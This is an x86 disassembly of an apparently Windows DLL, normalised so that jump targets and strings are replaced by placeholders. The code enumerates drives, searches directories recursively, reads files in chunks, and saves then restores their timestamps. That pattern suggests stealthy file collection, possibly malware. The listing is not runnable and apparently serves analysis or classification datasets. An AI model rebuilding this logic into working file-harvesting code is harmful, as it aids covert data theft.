call sub_100048f8
jmp r-xdata
mov edi 0x458
push edi
call sub_10004aa8
pop ecx
push edi
mov esi eax
push 0x0
push esi
call [ memset@IAT ]
mov [ esi ] edi
mov [ esi + 0x4 ] 0x10
mov eax [ ebx + 0x10 ]
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_10005306
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x58 ]
mov [ esp + 0x20 ] 0x2
mov [ esp + 0x10 ] eax
cmp eax 0x14
je r-xdata
inc esi
cmp esi 0x1a
jl r-xdata
lea eax [ esi + 0x41 ]
push eax
push r--data
lea eax [ esp + 0x32c ]
push edi
push eax
call [ _snwprintf@IAT ]
mov ecx [ esp + 0x3c ]
and [ esp + 0x28 ] 0x0
and [ esp + 0x38 ] 0x0
add esp 0x10
lea eax [ esp + 0x28 ]
push eax
lea eax [ esp + 0x1c ]
push eax
lea eax [ ebx + 0x18 ]
push eax
lea eax [ esp + 0x330 ]
push eax
call sub_1000446a
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
imul eax eax 0x230
mov edi 0x458
add eax edi
push eax
call sub_10004aa8
mov esi eax
mov eax [ esp + 0x24 ]
imul eax eax 0x230
add eax edi
mov [ esi ] eax
mov [ esi + 0x4 ] 0x48
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
pop ecx
lea eax [ ebx + 0x18 ]
push eax
lea eax [ esi + 0x18 ]
push eax
call [ wcscpy@IAT ]
mov eax [ esp + 0x28 ]
mov [ esi + 0x220 ] eax
mov eax [ esp + 0x28 ]
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10002bff
mov esi eax
cmp [ esp + 0x10 ] edi
je r-xdata
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
mov eax [ ebx + 0x430 ]
add eax [ ebx + 0x42c ]
cmp eax [ ebx + 0x428 ]
jne r-xdata
push [ esp + 0x10 ]
jmp r-xdata
push [ esp + 0x18 ]
call sub_10004ad0
pop ecx
call sub_10004ad0
pop ecx
mov esi [ CreateFileW@IAT ]
xor eax eax
push eax
mov edi 0xa7
push edi
push 0x3
push eax
push 0x1
mov [ esp + 0x24 ] eax
push 0x80000000
lea eax [ ebx + 0x18 ]
push eax
call esi
mov [ esp + 0x18 ] eax
cmp eax 0xffffffff
je r-xdata
cmp [ esp + 0x18 ] edi
je r-xdata
lea ecx [ esp + 0x34 ]
push ecx
push eax
call [ GetFileSizeEx@IAT ]
mov eax [ ebx + 0x440 ]
or eax [ ebx + 0x444 ]
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x34 ]
jne r-xdata
call [ GetLastError@IAT ]
mov esi eax
call sub_10004d09
mov edi eax
push edi
push esi
push 0x0
call sub_10002bff
mov esi eax
test edi edi
je r-xdata
inc [ esp + 0x20 ]
add [ esp + 0x10 ] 0x18
cmp [ esp + 0x20 ] 0x1a
jl r-xdata
mov eax ecx
add eax 0x41
push eax
lea eax [ esp + 0x308 ]
push r--data
push eax
call [ sprintf@IAT ]
and [ esp + 0x3c ] 0x0
add esp 0xc
push r--data
call [ LoadLibraryA@IAT ]
mov [ esp + 0x2c ] eax
test eax eax
je r-xdata
mov edi 0x458
push edi
call sub_10004aa8
mov esi eax
pop ecx
test esi esi
je r-xdata
cmp eax 0x18
jne r-xdata
xor eax eax
inc eax
mov ecx esi
shl eax cl
test [ esp + 0x2fc ] eax
je r-xdata
mov ecx [ esp + 0x20 ]
test ecx ecx
jne r-xdata
imul eax eax 0x230
push eax
push [ esp + 0x14 ]
lea eax [ esi + 0x458 ]
push eax
call [ memcpy@IAT ]
add esp 0xc
jmp r-xdata
push 0x0
push 0x0
push 0x1
call sub_10002bff
mov esi eax
jmp r-xdata
call [ CloseHandle@IAT ]
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
lea eax [ esp + 0x34 ]
push eax
lea eax [ esp + 0x60 ]
push eax
lea eax [ esp + 0x5c ]
push eax
push [ esp + 0x24 ]
call [ GetFileTime@IAT ]
push [ esp + 0x18 ]
call [ CloseHandle@IAT ]
push 0x0
push edi
push 0x3
push 0x0
push 0x1
push 0x100
lea eax [ ebx + 0x220 ]
push eax
call esi
mov esi eax
cmp esi 0xffffffff
je r-xdata
cmp [ ebx + 0x440 ] ecx
jne r-xdata
mov [ ebx + 0x440 ] ecx
mov [ ebx + 0x444 ] eax
push [ ebx + 0x10 ]
push edi
call sub_10004ad0
pop ecx
mov ecx [ esp + 0x20 ]
xor eax eax
inc eax
shl eax cl
test [ esi + 0x18 ] eax
je r-xdata
jmp r-xdata
and [ esp + 0x540 ] 0x0
lea eax [ esp + 0x304 ]
push eax
call [ esp + 0x34 ]
dec eax
dec eax
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
and [ esp + 0x18 ] 0x0
push 0x4
mov [ esp + 0x2c ] eax
xor eax eax
pop edi
push edi
push 0x0
push esi
call [ memset@IAT ]
mov [ esi ] edi
mov [ esi + 0x4 ] 0x14
mov eax [ ebx + 0x10 ]
add esp 0xc
mov [ esi + 0x10 ] eax
lea edi [ ebx + 0x18 ]
lea eax [ esi + 0x18 ]
push edi
push eax
call [ wcscpy@IAT ]
pop ecx
pop ecx
push edi
call [ GetFileAttributesW@IAT ]
mov [ esi + 0x220 ] eax
jmp r-xdata
and [ esp + 0x2c ] esi
mov edi 0x100
lea eax [ ebx + 0x18 ]
push edi
push eax
lea eax [ esp + 0x32c ]
push eax
call [ wcsncpy@IAT ]
mov esi [ GetFileAttributesW@IAT ]
xor eax eax
mov [ esp + 0x52e ] ax
add esp 0xc
lea eax [ esp + 0x324 ]
push eax
call esi
cmp eax 0xffffffff
je r-xdata
add eax ecx
imul eax eax 0x230
push eax
push [ esp + 0x14 ]
call [ realloc@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
imul eax eax 0x230
push eax
call sub_10004aa8
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x2c ]
mov [ esp + 0x24 ] eax
imul eax eax 0x230
pop ecx
push eax
push [ esp + 0x1c ]
push [ esp + 0x18 ]
jmp r-xdata
xor edi edi
call sub_10004d09
mov edi eax
jmp r-xdata
lea eax [ esp + 0x34 ]
push eax
lea eax [ esp + 0x60 ]
push eax
lea eax [ esp + 0x5c ]
push eax
push esi
call [ SetFileTime@IAT ]
push esi
call [ CloseHandle@IAT ]
mov [ ebx + 0x448 ] esi
mov [ ebx + 0x44c ] esi
mov [ ebx + 0x440 ] ecx
mov [ ebx + 0x444 ] eax
cmp [ ebx + 0x444 ] eax
jne r-xdata
cmp [ esp + 0x20 ] 0x2
jge r-xdata
dec eax
je r-xdata
mov cl [ esp + eax + 0x2b ]
mov [ esp + eax + 0x1b ] cl
dec eax
dec edi
jne r-xdata
mov eax [ esp + 0x18 ]
mov [ esp + 0x30 ] eax
lea esi [ esp + 0x20 ]
call sub_100049c7
lea esi [ esp + 0x2fc ]
mov [ esp + 0x540 ] 0x4
call sub_10004a12
lea esi [ esp + 0x10 ]
call sub_10004a5d
lea eax [ esp + 0xac ]
push eax
lea eax [ esp + 0x328 ]
push eax
mov [ esp + 0x548 ] 0x6
call [ esp + 0x2c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
lea eax [ esp + 0x324 ]
push eax
call esi
test al 0x10
je r-xdata
mov ecx [ esp + 0x28 ]
imul ecx ecx 0x230
push ecx
mov ecx [ esp + 0x24 ]
push [ esp + 0x1c ]
imul ecx ecx 0x230
add ecx eax
mov [ esp + 0x18 ] eax
push ecx
call [ memcpy@IAT ]
add esp 0xc
push edi
jmp r-xdata
xor eax eax
cmp [ esp + 0x10 ] eax
push edi
push [ esp + 0x14 ]
sete al
push eax
call sub_10002bff
mov esi eax
test edi edi
je r-xdata
mov edi 0x1858
push edi
call sub_10004aa8
mov esi eax
pop ecx
test esi esi
je r-xdata
jb r-xdata
cmp eax [ ebx + 0x44c ]
ja r-xdata
push r--data
push r--data
jmp r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
mov eax [ esp + 0x2c ]
imul eax eax 0x230
mov edi 0x458
add eax edi
push eax
call sub_10004aa8
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ esp + 0x2c ] 0x1
jmp r-xdata
and [ esp + 0x18 ] 0x0
and [ esp + 0x1c ] 0x0
push r--data
call [ LoadLibraryA@IAT ]
mov [ esp + 0x18 ] eax
test eax eax
je r-xdata
push 0xe
pop eax
call sub_10004d09
mov edi eax
push edi
push 0xe
push 0x0
call sub_10002bff
mov esi eax
test edi edi
je r-xdata
push edi
push 0x0
push esi
call [ memset@IAT ]
add esp 0xc
and [ esi + 0x454 ] 0x0
mov [ esi ] edi
mov [ esi + 0x450 ] 0x1400
jmp r-xdata
mov eax [ ebx + 0x440 ]
sub eax [ ebx + 0x448 ]
mov edi 0x458
add eax edi
push eax
call sub_10004aa8
mov esi eax
pop ecx
test esi esi
je r-xdata
cmp ecx 0x1400
jae r-xdata
mov ecx [ ebx + 0x440 ]
sub ecx [ ebx + 0x448 ]
mov eax [ ebx + 0x444 ]
sbb eax [ ebx + 0x44c ]
cmp eax esi
ja r-xdata
jb r-xdata
lea eax [ esp + 0x34 ]
push eax
lea eax [ esp + 0x60 ]
push eax
push 0x0
lea eax [ esp + 0x310 ]
push eax
mov [ esp + 0x550 ] 0x1
call [ esp + 0x68 ]
test eax eax
je r-xdata
push r--data
push edi
call [ GetProcAddress@IAT ]
mov [ esp + 0x28 ] eax
xor eax eax
push 0x4
mov [ esp + 0x1c ] eax
pop ecx
lea eax [ esp + 0x300 ]
push r--data
jmp r-xdata
dec eax
je r-xdata
mov edi [ esp + 0x2c ]
imul edi edi 0x230
add edi 0x458
push edi
push 0x0
push esi
call [ memset@IAT ]
mov [ esi ] edi
mov [ esi + 0x4 ] 0x18
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
add esp 0xc
lea eax [ ebx + 0x18 ]
push eax
lea eax [ esi + 0x18 ]
push eax
call [ wcscpy@IAT ]
mov eax [ esp + 0x34 ]
pop ecx
pop ecx
mov [ esi + 0x220 ] eax
test eax eax
je r-xdata
and [ esp + 0x2c ] eax
push edi
call sub_10004aa8
pop ecx
mov esi eax
lea eax [ esp + 0xac ]
push eax
push esi
call [ esp + 0x308 ]
test eax eax
jne r-xdata
mov [ esp + 0x540 ] 0x2
and [ esp + 0x2fc ] 0x0
and [ esp + 0x300 ] 0x0
push r--data
call [ LoadLibraryA@IAT ]
mov [ esp + 0x2fc ] eax
test eax eax
je r-xdata
lea esi [ esp + 0x18 ]
call sub_10004961
push [ esp + 0x20 ]
push edi
call sub_10004ad0
pop ecx
mov edi [ wcsncpy@IAT ]
mov [ esi + 0x4 ] 0x24
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
push 0x104
lea eax [ ebx + 0x18 ]
push eax
lea eax [ esi + 0x18 ]
push eax
call edi
add esp 0xc
push 0x104
lea eax [ ebx + 0x220 ]
push eax
lea eax [ esi + 0x220 ]
push eax
call edi
add esp 0xc
lea eax [ esi + 0x438 ]
push eax
lea eax [ esi + 0x430 ]
push eax
lea eax [ esi + 0x428 ]
push eax
push [ esp + 0x2c ]
call [ GetFileTime@IAT ]
mov eax [ ebx + 0x440 ]
mov [ esi + 0x440 ] eax
mov eax [ ebx + 0x444 ]
mov [ esi + 0x444 ] eax
mov ecx [ ebx + 0x448 ]
xor edi edi
push edi
mov [ esi + 0x448 ] ecx
mov ecx [ ebx + 0x44c ]
push edi
push ecx
push [ esi + 0x448 ]
mov [ esi + 0x44c ] ecx
push [ esp + 0x30 ]
call [ SetFilePointerEx@IAT ]
push edi
lea eax [ esp + 0x300 ]
push eax
push [ esi + 0x450 ]
lea eax [ esi + 0x458 ]
push eax
push [ esp + 0x30 ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x440 ]
sub eax [ ebx + 0x448 ]
add eax edi
push eax
push 0x0
push esi
call [ memset@IAT ]
mov eax [ ebx + 0x440 ]
sub eax [ ebx + 0x448 ]
add esp 0xc
add eax edi
mov [ esi ] eax
mov eax [ ebx + 0x440 ]
sub eax [ ebx + 0x448 ]
mov ecx [ ebx + 0x444 ]
sbb ecx [ ebx + 0x44c ]
mov [ esi + 0x450 ] eax
mov [ esi + 0x454 ] ecx
cmp ecx [ ebx + 0x448 ]
jae r-xdata
test edi edi
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x5c ]
mov [ eax ] ecx
mov ecx [ esp + 0x60 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x34 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x38 ]
mov [ eax + 0xc ] ecx
mov dl [ esp + eax + 0x2b ]
mov [ esp + eax + 0x1b ] dl
dec eax
dec ecx
jne r-xdata
mov eax [ esp + 0x18 ]
mov [ esp + 0x58 ] eax
push r--data
jmp r-xdata
dec eax
lea eax [ esp + 0x2fc ]
je r-xdata
xor edi edi
cmp [ esp + 0x10 ] edi
je r-xdata
lea eax [ esp + 0xac ]
push eax
lea eax [ esp + 0x328 ]
lea edi [ esi + 0x458 ]
push eax
mov [ esp + 0x20 ] edi
call [ esp + 0x2c ]
mov [ esp + 0x28 ] eax
inc [ esp + 0x2c ]
push esi
call [ esp + 0x18 ]
lea eax [ esp + 0x324 ]
push eax
mov [ esp + 0x544 ] 0x3
call [ esp + 0x304 ]
cmp [ esp + eax * 2 + 0x326 ] 0x5c
pop ecx
je r-xdata
lea esi [ esp + 0x2fc ]
call sub_10004994
push [ esp + 0x20 ]
call [ CloseHandle@IAT ]
mov eax [ ebx + 0x448 ]
mov edi [ ebx + 0x440 ]
mov ecx [ ebx + 0x44c ]
mov edx [ ebx + 0x444 ]
sub edi eax
sbb edx ecx
test edx edx
ja r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x18 ] eax
call sub_10004d09
push esi
mov edi eax
call sub_10004ad0
pop ecx
push edi
push [ esp + 0x1c ]
push 0x0
call sub_10002bff
mov esi eax
test edi edi
je r-xdata
or [ esp + 0x540 ] 0xffffffff
cmp [ esp + 0x2c ] 0x0
je r-xdata
push edi
call [ FreeLibrary@IAT ]
push r--data
jmp r-xdata
push r--data
jmp r-xdata
cmp [ esp + 0x2fc ] edi
je r-xdata
push [ esp + 0x10 ]
call [ FreeLibrary@IAT ]
push [ esp + 0x28 ]
call [ esp + 0x18 ]
lea eax [ esp + 0xac ]
push eax
push [ esp + 0x2c ]
call [ esp + 0x308 ]
test eax eax
jne r-xdata
mov esi [ esp + 0x1c ]
lea eax [ esp + 0x324 ]
push eax
call [ esp + 0x304 ]
pop ecx
sub edi eax
push edi
lea eax [ esp + 0x328 ]
push r--data
push eax
call esi
add esp 0xc
cmp [ esp + 0x2fc ] 0x0
je r-xdata
mov esi [ esp + 0x1c ]
lea eax [ esp + 0x324 ]
push eax
call [ esp + 0x304 ]
pop ecx
mov ecx edi
sub ecx eax
push ecx
lea eax [ esp + 0x328 ]
push r--data
push eax
call esi
add esp 0xc
add eax 0x1400
adc ecx 0x0
mov [ ebx + 0x448 ] eax
mov [ ebx + 0x44c ] ecx
jmp r-xdata
jb r-xdata
push [ esp + 0x20 ]
call [ CloseHandle@IAT ]
push edi
call sub_10004ad0
pop ecx
push [ esp + 0x2c ]
call [ FreeLibrary@IAT ]
push eax
call [ strcpy@IAT ]
pop ecx
pop ecx
lea eax [ esp + 0x2fc ]
push eax
mov eax [ esp + 0x14 ]
add eax 0xfffffff8
push eax
call [ strcpy@IAT ]
and [ esp + 0x60 ] 0x0
pop ecx
pop ecx
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
mov [ esp + 0x54 ] edi
test edi edi
je r-xdata
cmp [ esp + 0x20 ] edi
je r-xdata
push [ esp + 0x2fc ]
call [ FreeLibrary@IAT ]
push 0x104
lea eax [ esp + 0xdc ]
push eax
push edi
call [ wcsncpy@IAT ]
xor eax eax
mov [ edi + 0x206 ] ax
mov eax [ esp + 0xb8 ]
mov [ edi + 0x208 ] eax
mov ecx [ esp + 0xd4 ]
xor eax eax
or eax [ esp + 0xd8 ]
xor edi edi
or ecx edi
mov edi [ esp + 0x24 ]
mov [ edi + 0x210 ] eax
mov [ edi + 0x214 ] ecx
mov eax [ esp + 0xbc ]
mov [ edi + 0x218 ] eax
mov eax [ esp + 0xc0 ]
mov [ edi + 0x21c ] eax
mov eax [ esp + 0xc4 ]
mov [ edi + 0x220 ] eax
mov eax [ esp + 0xc8 ]
mov [ edi + 0x224 ] eax
mov eax [ esp + 0xcc ]
mov [ edi + 0x228 ] eax
mov eax [ esp + 0xd0 ]
mov [ edi + 0x22c ] eax
add edi 0x230
add esp 0xc
dec [ esp + 0x2c ]
mov [ esp + 0x18 ] edi
je r-xdata
cmp [ esp + 0x18 ] 0x0
je r-xdata
push [ esp + 0x2fc ]
call [ FreeLibrary@IAT ]
push [ ebx + 0x10 ]
jmp r-xdata
cmp edi 0x1400
jb r-xdata
mov edi [ ebx + 0x14 ]
mov eax [ esp + 0x30 ]
call sub_1000486f
jmp r-xdata
push [ esp + 0x20 ]
call [ FreeLibrary@IAT ]
jmp r-xdata
push [ esp + 0x18 ]
call [ FreeLibrary@IAT ]
sub_10003de7
push 0x8b4
mov eax sub_1000fcaf
call sub_1000fc19
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x8bc ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x894 ] eax
mov eax [ ebp + 0x10 ]
lea esi [ ebp - 0x8b4 ]
mov [ ebp - 0x8c0 ] ecx
mov [ ebp - 0x89c ] eax
call sub_10004a12
xor ebx ebx
lea esi [ ebp - 0x8a4 ]
mov [ ebp - 0x4 ] ebx
call sub_100049c7
lea esi [ ebp - 0x8ac ]
call sub_10004a5d
mov [ ebp - 0x890 ] ebx
mov [ ebp - 0x88c ] ebx
mov ebx [ LoadLibraryA@IAT ]
push r--data
call ebx
mov [ ebp - 0x890 ] eax
test eax eax
je r-xdata
and [ ebp - 0x884 ] 0x0
and [ ebp - 0x880 ] 0x0
push r--data
call ebx
mov [ ebp - 0x884 ] eax
test eax eax
je r-xdata
lea esi [ ebp - 0x890 ]
call sub_10004961
mov esi [ ebp - 0x8bc ]
push esi
mov [ ebp - 0x4 ] 0x4
call [ ebp - 0x880 ]
pop ecx
push esi
mov [ ebp - 0x898 ] eax
call [ ebp - 0x880 ]
cmp [ esi + eax * 2 - 0x2 ] 0x5c
pop ecx
je r-xdata
lea esi [ ebp - 0x884 ]
call sub_10004994
push [ ebp - 0x894 ]
mov ebx [ wcscpy@IAT ]
lea eax [ ebp - 0x424 ]
push eax
call ebx
lea eax [ ebp - 0x424 ]
push eax
call [ ebp - 0x880 ]
add esp 0xc
cmp [ ebp + eax * 2 - 0x426 ] 0x5c
je r-xdata
inc [ ebp - 0x898 ]
mov esi [ ebp - 0x88c ]
lea eax [ ebp - 0x424 ]
push eax
call [ ebp - 0x880 ]
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x424 ]
push r--data
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x87c ]
push eax
lea eax [ ebp - 0x424 ]
push eax
call [ ebp - 0x8a0 ]
mov [ ebp - 0x8b8 ] eax
cmp eax 0xffffffff
je r-xdata
mov esi [ ebp - 0x88c ]
lea eax [ ebp - 0x424 ]
push eax
call [ ebp - 0x880 ]
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x424 ]
push r--data
push eax
call esi
add esp 0xc
mov esi [ FreeLibrary@IAT ]
xor edi edi
cmp [ ebp - 0x884 ] edi
je r-xdata
test [ ebp - 0x87c ] 0x10
je r-xdata
cmp [ ebp - 0x890 ] edi
je r-xdata
push [ ebp - 0x884 ]
call esi
mov eax [ edi ]
mov esi [ ebp - 0x89c ]
inc eax
imul eax eax 0x230
push eax
push [ esi ]
call [ realloc@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
mov esi [ wcscmp@IAT ]
lea eax [ ebp - 0x850 ]
push r--data
push eax
call esi
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x8ac ] edi
je r-xdata
push [ ebp - 0x890 ]
call esi
push [ ebp - 0x8b8 ]
call [ ebp - 0x8a8 ]
mov [ esi ] eax
inc [ edi ]
mov esi [ edi ]
imul esi esi 0x230
push 0x230
lea esi [ esi + eax - 0x230 ]
push 0x0
push esi
call [ memset@IAT ]
add esp 0xc
push [ ebp - 0x894 ]
lea eax [ ebp - 0x21c ]
push eax
call ebx
lea eax [ ebp - 0x21c ]
push eax
call [ ebp - 0x880 ]
add esp 0xc
cmp [ ebp + eax * 2 - 0x21e ] 0x5c
je r-xdata
lea eax [ ebp - 0x87c ]
push eax
push [ ebp - 0x8b8 ]
call [ ebp - 0x8b0 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x850 ]
push r--data
push eax
call esi
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x8a4 ] edi
je r-xdata
push [ ebp - 0x8ac ]
call esi
mov eax [ ebp - 0x88c ]
mov [ ebp - 0x888 ] eax
lea eax [ ebp - 0x21c ]
push eax
call [ ebp - 0x880 ]
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x850 ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call [ ebp - 0x888 ]
mov eax [ ebp - 0x898 ]
add esp 0xc
lea eax [ ebp + eax * 2 - 0x21c ]
push eax
push esi
call ebx
xor eax eax
or eax [ ebp - 0x85c ]
pop ecx
pop ecx
mov ecx [ ebp - 0x860 ]
mov [ esi + 0x210 ] eax
xor ebx ebx
or ecx ebx
mov [ esi + 0x214 ] ecx
mov eax [ ebp - 0x87c ]
mov [ esi + 0x208 ] eax
mov eax [ ebp - 0x878 ]
mov [ esi + 0x218 ] eax
mov eax [ ebp - 0x874 ]
mov [ esi + 0x21c ] eax
mov eax [ ebp - 0x870 ]
mov [ esi + 0x220 ] eax
mov eax [ ebp - 0x86c ]
mov [ esi + 0x224 ] eax
mov eax [ ebp - 0x868 ]
mov [ esi + 0x228 ] eax
mov eax [ ebp - 0x864 ]
mov [ esi + 0x22c ] eax
mov eax [ ebp - 0x88c ]
mov [ ebp - 0x888 ] eax
lea eax [ ebp - 0x21c ]
push eax
call [ ebp - 0x880 ]
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x21c ]
push r--data
push eax
call [ ebp - 0x888 ]
add esp 0xc
push [ ebp - 0x894 ]
lea eax [ ebp - 0x62c ]
push eax
call ebx
lea eax [ ebp - 0x62c ]
push eax
call [ ebp - 0x880 ]
add esp 0xc
cmp [ ebp + eax * 2 - 0x62e ] 0x5c
je r-xdata
cmp [ ebp - 0x8b4 ] edi
je r-xdata
push [ ebp - 0x8a4 ]
call esi
mov esi [ ebp - 0x88c ]
lea eax [ ebp - 0x62c ]
push eax
call [ ebp - 0x880 ]
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x850 ]
push eax
lea eax [ ebp - 0x62c ]
push eax
call esi
mov eax [ edi ]
mov esi [ ebp - 0x89c ]
add esp 0xc
inc eax
imul eax eax 0x230
push eax
push [ esi ]
call [ realloc@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x62c ]
push r--data
push eax
call [ wcscat@IAT ]
pop ecx
pop ecx
call sub_1000fc63
retn 0x10
push [ ebp - 0x8b4 ]
call esi
mov [ esi ] eax
inc [ edi ]
mov esi [ edi ]
imul esi esi 0x230
push 0x230
lea esi [ esi + eax - 0x230 ]
push 0x0
push esi
call [ memset@IAT ]
add esp 0xc
push [ ebp - 0x894 ]
lea eax [ ebp - 0x21c ]
push eax
call ebx
lea eax [ ebp - 0x21c ]
push eax
call [ ebp - 0x880 ]
add esp 0xc
cmp [ ebp + eax * 2 - 0x21e ] 0x5c
je r-xdata
mov eax [ ebp - 0x88c ]
mov [ ebp - 0x888 ] eax
lea eax [ ebp - 0x21c ]
push eax
call [ ebp - 0x880 ]
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x850 ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call [ ebp - 0x888 ]
mov eax [ ebp - 0x898 ]
add esp 0xc
lea eax [ ebp + eax * 2 - 0x21c ]
push eax
push esi
call ebx
xor eax eax
or eax [ ebp - 0x85c ]
pop ecx
pop ecx
mov ecx [ ebp - 0x860 ]
mov [ esi + 0x210 ] eax
xor ebx ebx
or ecx ebx
mov [ esi + 0x214 ] ecx
mov eax [ ebp - 0x87c ]
mov ecx [ ebp - 0x8c0 ]
mov [ esi + 0x208 ] eax
mov eax [ ebp - 0x878 ]
mov [ esi + 0x218 ] eax
mov eax [ ebp - 0x874 ]
mov [ esi + 0x21c ] eax
mov eax [ ebp - 0x870 ]
mov [ esi + 0x220 ] eax
mov eax [ ebp - 0x86c ]
mov [ esi + 0x224 ] eax
mov eax [ ebp - 0x868 ]
mov [ esi + 0x228 ] eax
mov eax [ ebp - 0x864 ]
push edi
push [ ebp - 0x89c ]
mov [ esi + 0x22c ] eax
lea eax [ ebp - 0x62c ]
push eax
push [ ebp - 0x8bc ]
call sub_10003de7
jmp r-xdata
mov eax [ ebp - 0x88c ]
mov [ ebp - 0x888 ] eax
lea eax [ ebp - 0x21c ]
push eax
call [ ebp - 0x880 ]
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x21c ]
push r--data
push eax
call [ ebp - 0x888 ]
add esp 0xc
mov ebx [ wcscpy@IAT ]
sub_1000439e
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
and [ ebp + 0xc ] 0x0
push 0x2
mov [ ebp + 0xb ] 0x1
pop ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp edx 0x2a
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0xc ] eax
jne r-xdata
mov ax [ esi ]
mov edx [ ebp - 0x4 ]
xor ecx ecx
cmp ax [ edx ]
xor eax eax
cmp edx 0x3f
sete al
mov [ ebp + 0xc ] eax
lea eax [ edi + 0x2 ]
mov [ ebp + 0xc ] ebx
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp + 0xb ] 0x0
je r-xdata
mov ax [ esi ]
xor ecx ecx
cmp ax [ edi ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
sub ecx 0x0
je r-xdata
movzx eax [ esi ]
test ax ax
je r-xdata
xor eax eax
mov cx [ esi ]
cmp cx [ edi ]
je r-xdata
sete al
jmp r-xdata
cmp ax dx
sete [ ebp + 0xb ]
add esi ebx
add edi ebx
dec ecx
je r-xdata
movzx edx [ edi ]
test dx dx
je r-xdata
mov [ ebp + 0xb ] 0x1
add esi ebx
jmp r-xdata
dec ecx
jne r-xdata
add edi ebx
jmp r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
add esi ebx
mov ax [ esi ]
mov [ ebp + 0xb ] 0x1
cmp ax [ ecx ]
jne r-xdata
push ecx
push esi
call sub_1000439e
pop ecx
pop ecx
cmp al 0x1
jne r-xdata
sub_1000446a
push ebp
mov ebp esp
sub esp 0x684
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ wcscpy@IAT ]
push esi
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x680 ] ecx
mov ecx [ ebp + 0xc ]
push eax
mov [ ebp - 0x66c ] eax
mov [ ebp - 0x678 ] ecx
mov ecx [ ebp + 0x10 ]
lea eax [ ebp - 0x418 ]
push eax
mov [ ebp - 0x670 ] ecx
mov [ ebp - 0x67c ] edi
call ebx
mov esi [ wcslen@IAT ]
lea eax [ ebp - 0x418 ]
push eax
call esi
add esp 0xc
cmp [ ebp + eax * 2 - 0x41a ] 0x5c
je r-xdata
push r--data
push [ ebp - 0x66c ]
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x418 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x418 ]
push r--data
push eax
call [ wcsncat@IAT ]
add esp 0xc
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn 0x10
push r--data
push [ ebp - 0x66c ]
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x418 ]
push eax
call esi
pop ecx
mov ecx 0x103
sub ecx eax
push ecx
lea eax [ ebp - 0x418 ]
push r--data
push eax
call [ wcsncat@IAT ]
add esp 0xc
lea eax [ ebp - 0x668 ]
push eax
lea eax [ ebp - 0x418 ]
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x674 ] eax
cmp eax 0xffffffff
je r-xdata
test [ ebp - 0x668 ] 0x10
lea eax [ ebp - 0x63c ]
jne r-xdata
push r--data
push eax
call [ wcscmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x678 ]
push eax
call sub_1000439e
pop ecx
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0x668 ]
push eax
push [ ebp - 0x674 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x63c ]
push r--data
push eax
call [ wcscmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi ]
inc eax
